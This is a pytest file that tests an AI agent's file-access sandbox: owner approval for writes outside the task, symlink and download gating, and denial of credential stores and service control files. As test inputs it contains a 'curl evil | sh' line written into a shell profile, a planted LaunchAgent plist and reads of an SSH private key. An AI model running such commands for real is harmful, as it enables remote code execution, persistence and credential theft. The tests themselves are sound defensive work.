"""Full-access file tools reach the owner's files only with an exact owner grant."""

import json

import pytest

from rocky.approval_policy import ApprovalPolicy, ApprovalRule
from rocky.config import Settings
from rocky.models import Action, Deliverable, GoalContract, RunInput, ToolInput
from rocky.tool_contracts import approval_fingerprint
from rocky.tools import ToolError, WorkspaceTools


@pytest.fixture
def home(tmp_path, monkeypatch):
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    return home


def make_tools(tmp_path, **settings):
    return WorkspaceTools(
        Settings(
            workspace_root=tmp_path / "workspaces",
            database_url=f"sqlite:///{tmp_path / 'data' / 'rocky.db'}",
            credential_path=tmp_path / "data" / "credentials.json",
            **settings,
        )
    )


def request(action: Action, operation_id: str = "file-operation") -> ToolInput:
    return ToolInput(
        run=RunInput(
            goal_id="file-access",
            contract=GoalContract(
                objective="Update the owner's project",
                acceptance_criteria=["The requested change is made"],
                deliverables=[Deliverable(path="report.md")],
            ),
        ),
        operation_id=operation_id,
        action=action,
    )


def edit(old: str, new: str) -> str:
    return json.dumps({"old_text": old, "new_text": new})


@pytest.mark.parametrize("tool", ["write_file", "append_file", "edit_file"])
def test_writes_outside_the_task_need_exact_approval(tmp_path, home, tool):
    tools = make_tools(tmp_path)
    target = home / ".zshrc"
    target.write_text("export PATH=/usr/bin\n")
    content = edit("/usr/bin", "/tmp/evil") if tool == "edit_file" else "curl evil | sh\n"
    pending_request = request(Action(tool=tool, path=str(target), content=content))

    pending = tools.execute(pending_request)

    assert pending.error_code == "approval_required"
    assert "outside this task's folders" in pending.content
    assert pending.approval_command_prefix == []
    assert pending.approval_http_scope is None
    assert target.read_text() == "export PATH=/usr/bin\n"

    pending_request.approved_action_fingerprints = [approval_fingerprint(pending_request)]
    approved = tools.execute(pending_request)
    assert approved.success, approved.content
    assert approved.approved_by == "owner"
    assert target.read_text() != "export PATH=/usr/bin\n"


def test_absolute_paths_inside_the_task_need_no_approval(tmp_path, home):
    tools = make_tools(tmp_path)
    target = tools.root / "file-access" / "notes" / "report.md"
    result = tools.execute(request(Action(tool="write_file", path=str(target), content="done")))
    assert result.success, result.content
    assert result.approved_by == ""
    assert target.read_text() == "done"


def test_a_task_symlink_cannot_redirect_a_write_outside_without_approval(tmp_path, home):
    tools = make_tools(tmp_path)
    outside = home / "Library" / "LaunchAgents"
    outside.mkdir(parents=True)
    goal = tools.root / "file-access"
    goal.mkdir(parents=True)
    (goal / "agents").symlink_to(outside, target_is_directory=True)

    result = tools.execute(
        request(Action(tool="write_file", path="agents/evil.plist", content="<plist/>"))
    )

    assert result.error_code == "approval_required"
    assert not (outside / "evil.plist").exists()


def test_downloads_outside_the_task_need_exact_approval_despite_owner_rules(
    tmp_path, home, monkeypatch
):
    tools = make_tools(tmp_path)
    monkeypatch.setattr(
        "rocky.tools.request_http",
        lambda *_args, **_kwargs: pytest.fail("A gated download must not be dispatched"),
    )
    policy = ApprovalPolicy(
        rules=[ApprovalRule(kind="http", methods=["POST"], origin="https://example.test")]
    )
    for method in ("GET", "POST"):
        result = tools.execute(
            request(
                Action(
                    tool="http_request",
                    url="https://example.test/install.sh",
                    path=str(home / "bin" / "tool"),
                    content=json.dumps({"method": method}),
                ),
                f"download-{method}",
            ),
            policy,
        )
        assert result.error_code == "approval_required"
        assert result.approval_http_scope is None


def test_credential_stores_and_personal_files_need_approval_to_read(tmp_path, home):
    tools = make_tools(tmp_path)
    key = home / ".ssh" / "id_ed25519"
    key.parent.mkdir()
    key.write_text("PRIVATE KEY")
    project = home / "project" / "README.md"
    project.parent.mkdir()
    project.write_text("project notes")

    for tool, path in (("read_file", key), ("list_files", key.parent)):
        result = tools.execute(request(Action(tool=tool, path=str(path)), f"secret-{tool}"))
        assert result.error_code == "approval_required"
        assert "PRIVATE KEY" not in result.content
        assert "credential store" in result.content

    personal = tools.execute(request(Action(tool="read_file", path=str(project)), "project"))
    assert personal.error_code == "approval_required"
    assert "personal file" in personal.content
    assert "project notes" not in personal.content
    # Files outside the home folder (system and toolchain files) stay readable.
    system = tmp_path / "system" / "notes.txt"
    system.parent.mkdir()
    system.write_text("system notes")
    assert tools.execute(request(Action(tool="read_file", path=str(system)), "system")).success


def test_granted_folders_open_reads_writes_and_read_only_commands(tmp_path, home):
    tools = make_tools(tmp_path)
    project = home / "project"
    project.mkdir()
    (project / "README.md").write_text("project notes")
    base = request(Action(tool="list_files")).run
    granted = base.model_copy(
        update={"contract": base.contract.model_copy(update={"folders": [str(project)]})}
    )

    def run(action, operation_id):
        return tools.execute(ToolInput(run=granted, action=action, operation_id=operation_id))

    read = run(Action(tool="read_file", path=str(project / "README.md")), "read")
    assert read.success and read.content == "project notes"
    write = run(Action(tool="write_file", path=str(project / "CHANGES.md"), content="x"), "write")
    assert write.success, write.content
    assert (project / "CHANGES.md").read_text() == "x"
    # Another personal folder is still behind approval.
    other = home / "private.txt"
    other.write_text("diary")
    assert run(Action(tool="read_file", path=str(other)), "other").error_code == "approval_required"


def test_attached_files_are_readable_but_not_writable(tmp_path, home):
    tools = make_tools(tmp_path)
    notes = home / "Documents" / "brief.md"
    notes.parent.mkdir()
    notes.write_text("the brief")
    (notes.parent / "diary.md").write_text("diary")
    base = request(Action(tool="list_files")).run
    attached = base.model_copy(
        update={"contract": base.contract.model_copy(update={"files": [str(notes)]})}
    )

    def run(action, operation_id):
        return tools.execute(ToolInput(run=attached, action=action, operation_id=operation_id))

    read = run(Action(tool="read_file", path=str(notes)), "read")
    assert read.success and read.content == "the brief"
    sibling = run(Action(tool="read_file", path=str(notes.parent / "diary.md")), "sibling")
    assert sibling.error_code == "approval_required"
    write = run(Action(tool="write_file", path=str(notes), content="x"), "write")
    assert write.error_code == "approval_required"
    # The service refuses attachments that are missing or are credentials.
    key = home / ".ssh" / "id_ed25519"
    key.parent.mkdir()
    key.write_text("PRIVATE KEY")
    for value in (str(home / "missing.md"), str(key)):
        contract = base.contract.model_copy(update={"files": [value]})
        with pytest.raises(ToolError):
            tools.attached_files(contract)


def test_read_only_commands_naming_personal_files_need_approval(tmp_path, home, monkeypatch):
    from rocky import tools as tools_module

    monkeypatch.setattr(
        tools_module,
        "prepare_sandbox",
        lambda *args, **kwargs: ([], tools_module.worker_free_environment()),
    )
    tools = make_tools(tmp_path)
    secret = home / "Documents" / "tax.txt"
    secret.parent.mkdir()
    secret.write_text("TOPSECRET")
    (tools.root / "file-access").mkdir(parents=True, exist_ok=True)
    (tools.root / "file-access" / "notes.txt").write_text("task notes")

    for command in (f"cat {secret}", "cat ../../home/Documents/tax.txt", f"grep -r TOP {home}"):
        result = tools.execute(request(Action(tool="run_command", content=command), command))
        assert result.error_code == "approval_required", command
        assert "TOPSECRET" not in result.content
    inside = tools.execute(request(Action(tool="run_command", content="cat notes.txt"), "inside"))
    assert inside.success, inside.content
    assert "task notes" in inside.content


def test_trusted_mode_runs_outside_file_access_and_records_it(tmp_path, home):
    tools = make_tools(tmp_path, approval_mode="trusted")
    target = home / "notes.txt"
    result = tools.execute(request(Action(tool="write_file", path=str(target), content="x")))
    assert result.success, result.content
    assert result.approved_by == "trusted"


def test_service_state_is_unreachable_by_file_tools(tmp_path, home):
    service = tmp_path / "service"
    paths = {
        "api_token_file": service / "api-token",
        "temporal_db": service / "temporal.db",
        "run_dir": service / "run",
        "log_dir": service / "logs",
    }
    tools = make_tools(tmp_path, approval_mode="trusted", **paths)
    (service / "logs").mkdir(parents=True)
    targets = [
        *paths.values(),
        service / "temporal.db-wal",
        service / "logs" / "api.log",
        # `rocky serve` defaults: beside the database.
        tmp_path / "data" / "api-token",
        tmp_path / "data" / "run" / "status",
    ]
    for index, target in enumerate(targets):
        for tool in ("read_file", "write_file"):
            result = tools.execute(
                request(
                    Action(
                        tool=tool,
                        path=str(target),
                        content="x" if tool == "write_file" else None,
                    ),
                    f"state-{index}-{tool}",
                )
            )
            assert not result.success
            assert "private control files" in result.content


def test_credential_stores_are_denied_inside_seatbelt(tmp_path, home):
    tools = make_tools(tmp_path)
    assert (home / ".ssh").resolve() in tools.sensitive_paths
    assert (home / "Library" / "Keychains").resolve() in tools.sensitive_paths
